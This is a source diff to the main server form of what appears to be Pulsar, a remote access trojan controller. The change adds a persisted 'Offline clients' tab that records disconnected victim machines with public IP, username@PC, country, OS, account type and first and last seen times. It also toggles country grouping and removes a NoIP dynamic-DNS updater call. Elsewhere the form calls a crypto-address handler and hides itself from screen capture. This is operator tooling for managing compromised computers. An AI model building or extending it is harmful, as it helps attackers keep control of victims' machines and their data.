@@ -16,6 +16,7 @@ using Pulsar.Server.Forms.DarkMode;
 using Pulsar.Server.Messages;
 using Pulsar.Server.Models;
 using Pulsar.Server.Networking;
+using Pulsar.Server.Persistence;
 using Pulsar.Server.Utilities;
 using System;
 using System.Collections.Generic;
@@ -51,6 +52,9 @@ namespace Pulsar.Server.Forms
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();
+        private readonly object _offlineRefreshLock = new object();
+        private bool _offlineRefreshPending;
+        private IReadOnlyList<OfflineClientRecord> _cachedOfflineClients = Array.Empty<OfflineClientRecord>();
         private PreviewHandler _previewImageHandler;
         private static readonly string PulsarStuffDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff");
         private readonly string AutoTasksFilePath = Path.Combine(PulsarStuffDir, "autotasks.json");
@@ -61,10 +65,15 @@ namespace Pulsar.Server.Forms
             _getCryptoAddressHander = new GetCryptoAddressHandler();
             _clientDebugLogHandler = new ClientDebugLog();
             RegisterMessageHandler();
+            OfflineClientRepository.Initialize();
+            OfflineClientRepository.ResetOnlineState();
             InitializeComponent();
             typeof(ListView).InvokeMember("DoubleBuffered",
                 System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
                 null, this.lstClients, new object[] { true });
+            typeof(ListView).InvokeMember("DoubleBuffered",
+                System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
+                null, this.lstOfflineClients, new object[] { true });
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
@@ -207,11 +216,6 @@ namespace Pulsar.Server.Forms
             {
                 StartConnectionListener();
             }
-
-            if (Settings.EnableNoIPUpdater)
-            {
-                NoIpUpdater.Start();
-            }
         }
 
         public void EventLogVisability()
@@ -226,6 +230,11 @@ namespace Pulsar.Server.Forms
                 DebugLogRichBox.Visible = false;
                 splitter1.Visible = false;
             }
+        }
+
+        public void RefreshClientGroups()
+        {
+            SortClientsByFavoriteStatus();
         }
 
         private void FrmMain_Load(object sender, EventArgs e)
@@ -269,6 +278,7 @@ namespace Pulsar.Server.Forms
             lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;
 
             LoadAutoTasks();
+            ScheduleOfflineListRefresh();
         }
 
         private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
@@ -518,6 +528,8 @@ namespace Pulsar.Server.Forms
             }
             else
             {
+                OfflineClientRepository.UpsertClient(client);
+                ScheduleOfflineListRefresh();
                 lock (_clientConnections)
                 {
                     if (!ListenServer.Listening) return;
@@ -538,6 +550,8 @@ namespace Pulsar.Server.Forms
 
         private void ClientDisconnected(Client client)
         {
+            OfflineClientRepository.MarkClientOffline(client);
+            ScheduleOfflineListRefresh();
             lock (_clientConnections)
             {
                 if (!ListenServer.Listening) return;
@@ -956,11 +970,18 @@ namespace Pulsar.Server.Forms
             {
                 if (item.Tag is Client client)
                 {
-                    string country = client.Value?.Country ?? "Unknown";
-                    string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
-                    
-                    var group = GetGroupFromCountry(country, countryWithCode);
-                    item.Group = group;
+                    if (Settings.ShowCountryGroups)
+                    {
+                        string country = client.Value?.Country ?? "Unknown";
+                        string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
+                        
+                        var group = GetGroupFromCountry(country, countryWithCode);
+                        item.Group = group;
+                    }
+                    else
+                    {
+                        item.Group = null;
+                    }
                     
                     if (ShouldShowClientInSearch(client, item))
                     {
@@ -1028,9 +1049,16 @@ namespace Pulsar.Server.Forms
                     {
                         lstClients.BeginUpdate();
                         
-                        string country = client.Value?.Country ?? "Unknown";
-                        string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
-                        lvi.Group = GetGroupFromCountry(country, countryWithCode);
+                        if (Settings.ShowCountryGroups)
+                        {
+                            string country = client.Value?.Country ?? "Unknown";
+                            string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
+                            lvi.Group = GetGroupFromCountry(country, countryWithCode);
+                        }
+                        else
+                        {
+                            lvi.Group = null;
+                        }
                         
                         if (ShouldShowClientInSearch(client, lvi))
                         {
@@ -1150,6 +1178,187 @@ namespace Pulsar.Server.Forms
             {
             }
         }
+
+        #region Offline clients
+
+        private void ScheduleOfflineListRefresh()
+        {
+            lock (_offlineRefreshLock)
+            {
+                if (_offlineRefreshPending)
+                {
+                    return;
+                }
+
+                _offlineRefreshPending = true;
+            }
+
+            ThreadPool.QueueUserWorkItem(_ =>
+            {
+                List<OfflineClientRecord> offlineClients;
+
+                try
+                {
+                    offlineClients = OfflineClientRepository.GetClientsByOnlineState(false)?.ToList()
+                        ?? new List<OfflineClientRecord>();
+                    ApplyOfflineNicknames(offlineClients);
+                    _cachedOfflineClients = offlineClients;
+                }
+                catch (Exception ex)
+                {
+                    offlineClients = new List<OfflineClientRecord>();
+                    _cachedOfflineClients = offlineClients;
+                    EventLog($"Failed to load offline clients: {ex.Message}", "error");
+                }
+                finally
+                {
+                    lock (_offlineRefreshLock)
+                    {
+                        _offlineRefreshPending = false;
+                    }
+                }
+
+                if (!IsHandleCreated || IsDisposed)
+                {
+                    return;
+                }
+
+                try
+                {
+                    this.BeginInvoke((MethodInvoker)(() =>
+                    {
+                        PopulateOfflineClientsList(_cachedOfflineClients);
+                        UpdateOfflineTabHeader(_cachedOfflineClients.Count);
+                    }));
+                }
+                catch (ObjectDisposedException)
+                {
+                }
+            });
+        }
+
+        private void ApplyOfflineNicknames(IList<OfflineClientRecord> clients)
+        {
+            if (clients == null || clients.Count == 0)
+            {
+                return;
+            }
+
+            string jsonFilePath = Path.Combine(PulsarStuffDir, "client_info.json");
+            var nicknameMap = LoadClientInfos(jsonFilePath);
+
+            foreach (var record in clients)
+            {
+                if (!string.IsNullOrEmpty(record.ClientId) && nicknameMap.TryGetValue(record.ClientId, out var info))
+                {
+                    record.Nickname = info?.Nickname;
+                }
+            }
+        }
+
+        private void PopulateOfflineClientsList(IReadOnlyList<OfflineClientRecord> clients)
+        {
+            if (lstOfflineClients == null || lstOfflineClients.IsDisposed)
+            {
+                return;
+            }
+
+            lstOfflineClients.BeginUpdate();
+            try
+            {
+                lstOfflineClients.Items.Clear();
+
+                if (clients == null)
+                {
+                    return;
+                }
+
+                foreach (var record in clients)
+                {
+                    var userAtPc = !string.IsNullOrEmpty(record.UserAtPc)
+                        ? record.UserAtPc
+                        : ComposeUserAtPc(record);
+
+                    var lastSeen = record.LastSeenUtc?.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") ?? "Unknown";
+                    var firstSeen = record.FirstSeenUtc?.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") ?? string.Empty;
+                    var countryWithCode = GetCountryWithCode(record);
+
+                    var item = new ListViewItem(new[]
+                    {
+                        " " + (record.PublicIP ?? "Unknown"),
+                        record.Nickname ?? string.Empty,
+                        record.Tag ?? string.Empty,
+                        userAtPc,
+                        record.Version ?? string.Empty,
+                        lastSeen,
+                        firstSeen,
+                        countryWithCode,
+                        record.OperatingSystem ?? string.Empty,
+                        record.AccountType ?? string.Empty
+                    })
+                    {
+                        Tag = record
+                    };
+
+                    if (record.ImageIndex >= 0 && record.ImageIndex < imgFlags.Images.Count)
+                    {
+                        item.ImageIndex = record.ImageIndex;
+                    }
+
+                    lstOfflineClients.Items.Add(item);
+                }
+            }
+            finally
+            {
+                lstOfflineClients.EndUpdate();
+            }
+        }
+
+        private static string ComposeUserAtPc(OfflineClientRecord record)
+        {
+            var username = record.Username ?? string.Empty;
+            var pcName = record.PcName ?? string.Empty;
+
+            if (string.IsNullOrEmpty(username) && string.IsNullOrEmpty(pcName))
+            {
+                return string.Empty;
+            }
+
+            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(pcName))
+            {
+                return $"{username}@{pcName}";
+            }
+
+            return username + pcName;
+        }
+
+        private static string GetCountryWithCode(OfflineClientRecord record)
+        {
+            if (string.IsNullOrEmpty(record.Country))
+            {
+                return string.Empty;
+            }
+
+            if (string.IsNullOrEmpty(record.CountryCode))
+            {
+                return record.Country;
+            }
+
+            return $"{record.Country} [{record.CountryCode}]";
+        }
+
+        private void UpdateOfflineTabHeader(int offlineCount)
+        {
+            if (tabOfflineClients == null || tabOfflineClients.IsDisposed)
+            {
+                return;
+            }
+
+            var title = offlineCount > 0 ? $"Offline ({offlineCount})" : "Offline";
+            tabOfflineClients.Text = title;
+        }
+
+        #endregion
 
         private readonly Dictionary<Client, Dictionary<string, object>> _pendingStatusUpdates = new Dictionary<Client, Dictionary<string, object>>();
         private readonly object _statusUpdateLock = new object();
@@ -1981,6 +2190,11 @@ namespace Pulsar.Server.Forms
             MainTabControl.SelectTab(tabPage2);
         }
 
+        private void offlineClientsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            MainTabControl.SelectTab(tabOfflineClients);
+        }
+
         private void clearSelectedToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (lstNoti.SelectedItems.Count > 0)
@@ -2301,6 +2515,12 @@ namespace Pulsar.Server.Forms
             {
                 RefreshStarButtons();
                 SortClientsByFavoriteStatus();
+            }
+            else if (MainTabControl.SelectedTab == tabOfflineClients)
+            {
+                PopulateOfflineClientsList(_cachedOfflineClients);
+                UpdateOfflineTabHeader(_cachedOfflineClients.Count);
+                ScheduleOfflineListRefresh();
             }
         }
 
